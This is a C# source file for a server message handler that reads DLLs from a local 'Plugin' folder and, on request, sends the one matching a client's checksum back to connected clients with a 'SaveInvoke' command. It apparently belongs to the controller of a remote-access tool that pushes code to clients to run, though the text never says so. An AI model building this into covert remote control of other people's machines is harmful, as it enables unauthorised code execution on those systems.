using System;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerGetDLL
{
	public static void Read(Clients client, object[] objects)
	{
		try
		{
			if (client == null || objects == null || objects.Length < 2)
			{
				return;
			}
			string text = objects[1] as string;
			if (string.IsNullOrWhiteSpace(text))
			{
				return;
			}
			if (client.lastPing != null)
			{
				try
				{
					client.lastPing.Disconnect();
				}
				catch
				{
				}
			}
			if (text == "leb")
			{
				try
				{
					string lebPath = Path.Combine("Plugin", "Leb128.dll");
					if (File.Exists(lebPath))
					{
						byte[] lebBytes = File.ReadAllBytes(lebPath);
						client.Send(new object[3] { "SaveInvoke", text, lebBytes });
					}
					return;
				}
				catch
				{
					return;
				}
			}
			if (!Directory.Exists("Plugin"))
			{
				return;
			}
			string[] files;
			try
			{
				files = Directory.GetFiles("Plugin", "*.dll", SearchOption.TopDirectoryOnly);
			}
			catch
			{
				return;
			}
			string[] array = files;
			foreach (string filePath in array)
			{
				string checksum;
				try
				{
					checksum = Methods.GetChecksum(filePath);
				}
				catch
				{
					continue;
				}
				if (string.Equals(text, checksum, StringComparison.OrdinalIgnoreCase))
				{
					byte[] dllBytes;
					try
					{
						dllBytes = File.ReadAllBytes(filePath);
					}
					catch
					{
						break;
					}
					try
					{
						client.Send(new object[3] { "SaveInvoke", text, dllBytes });
						break;
					}
					catch
					{
						break;
					}
				}
			}
		}
		catch
		{
		}
	}
}
